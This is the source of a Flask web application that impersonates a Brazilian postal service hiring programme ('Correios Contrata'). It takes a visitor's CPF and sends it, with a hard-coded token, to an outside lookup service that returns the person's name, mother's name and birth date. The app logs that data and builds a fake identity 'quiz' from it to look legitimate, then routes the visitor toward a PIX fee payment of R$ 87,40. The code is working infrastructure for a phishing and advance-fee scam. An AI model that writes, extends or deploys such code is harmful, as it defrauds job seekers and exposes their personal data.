import os
import logging
import requests
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, make_response
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from sqlalchemy.orm import DeclarativeBase

# Configure logging para produção
logging.basicConfig(
    level=logging.ERROR if os.environ.get('FLASK_ENV') == 'production' else logging.WARNING,
    format='%(asctime)s %(levelname)s: %(message)s'
)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Create the Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key-change-in-production")

# Configurações de produção para Heroku
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 31536000  # 1 ano de cache para assets estáticos
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Configurações específicas para produção
if os.environ.get('FLASK_ENV') == 'production':
    app.config['DEBUG'] = False
    app.config['TESTING'] = False

# Configure the database com otimizações para Heroku
database_url = os.environ.get("DATABASE_URL")
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = database_url

# Configurações otimizadas para Heroku
if os.environ.get('FLASK_ENV') == 'production':
    app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
        "pool_recycle": 280,
        "pool_pre_ping": True,
        "pool_size": 5,
        "max_overflow": 10,
        "connect_args": {
            "connect_timeout": 10,
            "application_name": "correios_contrata"
        }
    }
else:
    app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
        "pool_recycle": 300,
        "pool_pre_ping": True,
    }

# Initialize extensions
db.init_app(app)
migrate = Migrate(app, db)

# Define models directly in app.py to avoid import issues
class Program(db.Model):
    """Model for government education programs"""
    __tablename__ = 'programs'
    
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text, nullable=False)
    ministry = db.Column(db.String(100), nullable=False)
    program_type = db.Column(db.String(50), nullable=False)
    status = db.Column(db.String(20), default='active')
    published_date = db.Column(db.DateTime, default=datetime.utcnow)
    updated_date = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    def __repr__(self):
        return f'<Program {self.title}>'

class Position(db.Model):
    """Model for job positions within programs"""
    __tablename__ = 'positions'
    
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    description = db.Column(db.Text)
    requirements = db.Column(db.Text)
    salary_min = db.Column(db.Numeric(10, 2))
    salary_max = db.Column(db.Numeric(10, 2))
    workload_hours = db.Column(db.Integer)
    work_type = db.Column(db.String(50))
    program_id = db.Column(db.Integer, db.ForeignKey('programs.id'), nullable=False)
    
    def __repr__(self):
        return f'<Position {self.name}>'

# Create tables de forma simplificada
def init_database():
    """Inicializar banco de dados"""
    try:
        db.create_all()
        print("✅ Tabelas criadas com sucesso")
        
        # Verificar se precisa popular dados
        existing = Program.query.filter_by(title='Correios Contrata').first()
        if not existing:
            print("🔄 Populando banco de dados...")
            try:
                from populate_database import populate_database
                populate_database()
            except:
                print("⚠️ Erro ao popular banco - continuando sem dados iniciais")
                
    except Exception as e:
        print(f"⚠️ Erro na inicialização: {e}")

# Inicializar quando o app for importado
with app.app_context():
    init_database()

@app.route('/')
def index():
    """Main page showing the Correios Contrata program"""
    try:
        # Get program data from database with timeout
        program = Program.query.filter_by(title='Correios Contrata').first()
        positions = Position.query.filter_by(program_id=1).limit(10).all() if program else []
        
        response = make_response(render_template('index.html', program=program, positions=positions))
        # Cache longo para página inicial no Heroku
        response.headers['Cache-Control'] = 'public, max-age=1800, s-maxage=3600'
        response.headers['Vary'] = 'Accept-Encoding'
        return response
    except Exception as e:
        app.logger.error(f"Erro na página inicial: {e}")
        # Página de fallback sem dados do banco
        response = make_response(render_template('index.html', program=None, positions=[]))
        response.headers['Cache-Control'] = 'public, max-age=300'
        return response

@app.route('/acesso-informacao')
def acesso_informacao():
    """Access to Information page"""
    return render_template('index.html', page_title="Acesso à Informação")

@app.route('/acoes-programas')
def acoes_programas():
    """Actions and Programs page"""
    return render_template('index.html', page_title="Ações e Programas")

@app.route('/programas')
def programas():
    """Programs page"""
    return render_template('index.html', page_title="Programas")

@app.route('/bolsas-auxilios')
def bolsas_auxilios():
    """Scholarships and Aid page"""
    return render_template('index.html', page_title="Bolsas e Auxílios")

@app.route('/lista-programas')
def lista_programas():
    """Programs List page"""
    return render_template('index.html', page_title="Lista de Programas")

@app.route('/search')
def search():
    """Search API endpoint"""
    query = request.args.get('q', '').strip()
    results = []
    
    if query:
        # Search in programs
        programs = Program.query.filter(
            db.or_(
                Program.title.ilike(f'%{query}%'),
                Program.description.ilike(f'%{query}%'),
                Program.ministry.ilike(f'%{query}%'),
                Program.program_type.ilike(f'%{query}%')
            )
        ).filter_by(status='active').all()
        
        # Search in positions
        positions = Position.query.filter(
            db.or_(
                Position.name.ilike(f'%{query}%'),
                Position.description.ilike(f'%{query}%'),
                Position.requirements.ilike(f'%{query}%'),
                Position.work_type.ilike(f'%{query}%')
            )
        ).all()
        
        # Format results
        for program in programs:
            results.append({
                'type': 'program',
                'title': program.title,
                'description': program.description[:200] + '...' if len(program.description) > 200 else program.description,
                'ministry': program.ministry,
                'url': '/',
                'date': program.published_date.strftime('%d/%m/%Y') if program.published_date else ''
            })
        
        for position in positions:
            results.append({
                'type': 'position',
                'title': position.name,
                'description': position.description[:200] + '...' if position.description and len(position.description) > 200 else position.description or '',
                'salary': f'R$ {position.salary_min} - R$ {position.salary_max}' if position.salary_min and position.salary_max else '',
                'work_type': position.work_type,
                'url': '/',
                'workload': f'{position.workload_hours}h' if position.workload_hours else ''
            })
    
    return jsonify({
        'query': query,
        'total_results': len(results),
        'results': results
    })

@app.route('/busca')
def busca():
    """Search results page"""
    query = request.args.get('q', '').strip()
    results = []
    total_results = 0
    
    if query:
        # Get search results using the same logic as the API
        search_response = search()
        search_data = search_response.get_json()
        results = search_data['results']
        total_results = search_data['total_results']
    
    return render_template('search_results.html', 
                         query=query, 
                         results=results, 
                         total_results=total_results)

@app.route('/cadastro')
def cadastro():
    """Registration page for Correios program"""
    return render_template('cadastro.html', page_title="Cadastro - Correios Contrata")

@app.route('/resultados-busca')
def resultados_busca():
    """Results page showing available positions in the region"""
    cep = request.args.get('cep', '').strip()
    if not cep:
        return render_template('cadastro.html', page_title="Cadastro - Correios Contrata")
    
    # Validar e buscar dados do CEP via ViaCEP
    try:
        import requests
        cep_limpo = cep.replace('-', '').replace('.', '').replace(' ', '')
        response = requests.get(f'https://viacep.com.br/ws/{cep_limpo}/json/')
        dados_cep = response.json()
        
        if 'erro' in dados_cep:
            # CEP inválido
            return render_template('cadastro.html', 
                                 page_title="Cadastro - Correios Contrata",
                                 error="CEP não encontrado. Verifique e tente novamente.")
        
        localidade = dados_cep.get('localidade', 'Não informado')
        estado = dados_cep.get('estado', 'Não informado')
        uf = dados_cep.get('uf', '')
        bairro = dados_cep.get('bairro', 'Não informado')
        logradouro = dados_cep.get('logradouro', 'Não informado')
        
        # Gerar código da região baseado no CEP
        codigo_regiao = f"REG-{cep_limpo[:2]}-{cep_limpo[2:5]}"
        
    except Exception as e:
        # Em caso de erro na API, continuar com dados básicos
        localidade = 'Região Consultada'
        estado = 'Brasil'
        uf = ''
        bairro = 'Não informado'
        logradouro = 'Não informado'
        codigo_regiao = f"REG-{cep[:2]}-{cep[2:5]}" if len(cep) >= 5 else "REG-00-000"
    
    return render_template('resultados_busca.html', 
                         page_title="Resultados da Busca - Correios Contrata",
                         cep=cep,
                         localidade=localidade,
                         estado=estado,
                         uf=uf,
                         bairro=bairro,
                         logradouro=logradouro,
                         codigo_regiao=codigo_regiao)

@app.route('/buscar-escolas')
def buscar_escolas():
    """Search for Correios agencies near a given CEP"""
    cep = request.args.get('cep', '').strip()
    if not cep:
        return jsonify({'error': 'CEP é obrigatório'}), 400
    
    # For now, return mock data - we'll need Google Places API key for real data
    escolas = [
        {
            'nome': 'Agência Central dos Correios',
            'endereco': 'Rua das Flores, 123 - Centro',
            'distancia': '0.5 km',
            'telefone': '(11) 3456-7890'
        },
        {
            'nome': 'Agência dos Correios Vila Nova',
            'endereco': 'Av. Principal, 456 - Bairro Novo', 
            'distancia': '1.2 km',
            'telefone': '(11) 3456-7891'
        },
        {
            'nome': 'Centro de Distribuição Correios',
            'endereco': 'Rua da Logística, 789 - Vila Esperança',
            'distancia': '2.1 km', 
            'telefone': '(11) 3456-7892'
        }
    ]
    
    return jsonify({'escolas': escolas})

@app.route('/formulario-inscricao')
def formulario_inscricao():
    """Registration form page - CPF step"""
    return render_template('formulario_inscricao.html', page_title="Formulário de Inscrição - Correios Contrata")

@app.route('/validar-cpf', methods=['POST'])
def validar_cpf():
    """Validate CPF and get user data from API"""
    
    data = request.get_json()
    cpf = data.get('cpf', '').replace('.', '').replace('-', '')
    
    if not cpf or len(cpf) != 11:
        return jsonify({'error': 'CPF inválido'}), 400
    
    try:
        # Consultar API de CPF
        api_url = f"https://consulta.fontesderenda.blog/cpf.php?token=1285fe4s-e931-4071-a848-3fac8273c55a&cpf={cpf}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code != 200:
            return jsonify({'error': 'Erro ao consultar dados do CPF'}), 400
        
        dados_api = response.json()
        print(f"Resposta da API para CPF {cpf}: {dados_api}")  # Log para debug
        
        # Verificar se a API retornou dados válidos
        if 'DADOS' not in dados_api:
            print(f"API não retornou dados válidos: {dados_api}")
            return jsonify({'error': 'CPF não encontrado na base de dados'}), 404
        
        dados_usuario = dados_api['DADOS']
        
        nome_completo = dados_usuario.get('nome', '')
        nome_mae = dados_usuario.get('nome_mae', '')
        data_nascimento = dados_usuario.get('data_nascimento', '')
        sexo = dados_usuario.get('sexo', '')
        cpf_formatado = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
        
        # Gerar primeiro nome para o cabeçalho
        primeiro_nome = nome_completo.split()[0] if nome_completo else 'Usuário'
        
        # Gerar opções falsas para o quiz
        nomes_falsos = [
            "CARLOS EDUARDO SILVA",
            "MARIA FERNANDA SANTOS",
            "JOÃO PEDRO OLIVEIRA",
            "ANA CAROLINA SOUZA",
            "RAFAEL HENRIQUE COSTA",
            "JULIANA ALVES PEREIRA"
        ]
        
        maes_falsas = [
            "MARIA SILVA SANTOS",
            "REGINA OLIVEIRA COSTA",
            "CARMEN SOUZA PEREIRA",
            "HELENA FERNANDES LIMA",
            "BEATRIZ ALMEIDA ROCHA",
            "LUCIANA TORRES MENDOZA"
        ]
        
        # Gerar datas falsas (variação de ±10 anos)
        if data_nascimento:
            try:
                data_original = datetime.strptime(data_nascimento, '%Y-%m-%d %H:%M:%S')
                datas_falsas = []
                for i in range(5):
                    anos_diff = random.randint(-10, 10)
                    meses_diff = random.randint(-6, 6)
                    dias_diff = random.randint(-15, 15)
                    
                    nova_data = data_original + timedelta(days=anos_diff*365 + meses_diff*30 + dias_diff)
                    datas_falsas.append(nova_data.strftime('%Y-%m-%d %H:%M:%S'))
            except:
                datas_falsas = [
                    "1980-03-15 00:00:00",
                    "1985-07-22 00:00:00",
                    "1990-11-08 00:00:00",
                    "1995-02-14 00:00:00",
                    "1988-09-30 00:00:00"
                ]
        else:
            datas_falsas = [
                "1980-03-15 00:00:00",
                "1985-07-22 00:00:00",
                "1990-11-08 00:00:00"
            ]
        
        # Criar quiz com 3 opções cada
        quiz_nomes = random.sample(nomes_falsos, 2) + [nome_completo]
        random.shuffle(quiz_nomes)
        
        quiz_maes = random.sample(maes_falsas, 2) + [nome_mae]
        random.shuffle(quiz_maes)
        
        quiz_datas = random.sample(datas_falsas, 2) + [data_nascimento]
        random.shuffle(quiz_datas)
        
        return jsonify({
            'sucesso': True,
            'primeiro_nome': primeiro_nome,
            'dados_originais': {
                'nome': nome_completo,
                'nome_mae': nome_mae,
                'data_nascimento': data_nascimento,
                'sexo': sexo,
                'cpf': cpf
            },
            'quiz': {
                'nomes': quiz_nomes,
                'maes': quiz_maes,
                'datas': quiz_datas
            }
        })
        
    except requests.exceptions.RequestException as e:
        app.logger.error(f"Erro na API de CPF: {e}")
        return jsonify({'error': 'Erro de conexão com o serviço de validação'}), 500
    except Exception as e:
        app.logger.error(f"Erro inesperado: {e}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/comprovante-inscricao')
def comprovante_inscricao():
    """Proof of registration page"""
    return render_template('comprovante_inscricao.html', page_title="Comprovante de Inscrição - Correios Contrata")

@app.route('/pagamento-pix')
def pagamento_pix():
    """PIX payment page"""
    return render_template('pagamento_pix.html', page_title="Pagamento PIX - Correios Contrata")

@app.route('/api/gerar-pix', methods=['POST'])
def gerar_pix():
    """Generate PIX payment (mock for demo)"""
    dados = request.get_json()
    
    # Return mock response for demonstration
    return jsonify({
        'success': True,
        'transacao_id': 'demo-123456',
        'pix_code': '00020126360014BR.GOV.BCB.PIX2514www.bcb.gov.br0514mock-pix-demo63040000',
        'qr_code': '00020126360014BR.GOV.BCB.PIX2514www.bcb.gov.br0514mock-pix-demo63040000',
        'status': 'pending',
        'expires_at': '2025-07-31T23:59:59',
        'valor': 'R$ 87,40',
        'api_provider': 'Demo'
    })

@app.route('/api/verificar-pagamento/<string:transacao_id>')
def verificar_pagamento(transacao_id):
    """Verify PIX payment status (mock for demo)"""
    # Return mock payment verification for demonstration
    return jsonify({
        'pago': True,
        'status': 'completed',
        'transacao_id': transacao_id,
        'api_provider': 'Demo'
    })

@app.route('/pagamento-confirmado')
def pagamento_confirmado():
    """Payment confirmation page"""
    return render_template('pagamento_confirmado.html', page_title="Pagamento Confirmado - Correios Contrata")



@app.route('/registro-sgte')
def registro_sgte():
    """SGTC Registration page"""
    return render_template('registro_sgte.html', page_title="SGTC - Sistema de Gestão do Trabalho dos Correios")

@app.route('/agendamento-psicotecnico')
def agendamento_psicotecnico():
    """Psychotechnical exam scheduling page"""
    return render_template('agendamento_psicotecnico.html', page_title="Agendamento Psicotécnico - Correios Contrata")

@app.route('/confirmacao-agendamento')
def confirmacao_agendamento():
    """Confirmation page after scheduling data confirmation"""
    return render_template('confirmacao_agendamento.html', page_title="Confirmação de Agendamento - Correios Contrata")

@app.route('/login')
def login():
    """Login page (mock interface)"""
    return render_template('index.html', page_title="Login")

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return render_template('index.html', page_title="Página não encontrada"), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    return render_template('index.html', page_title="Erro interno do servidor"), 500

if __name__ == '__main__':
    # Run the app on port 5000 for local development
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
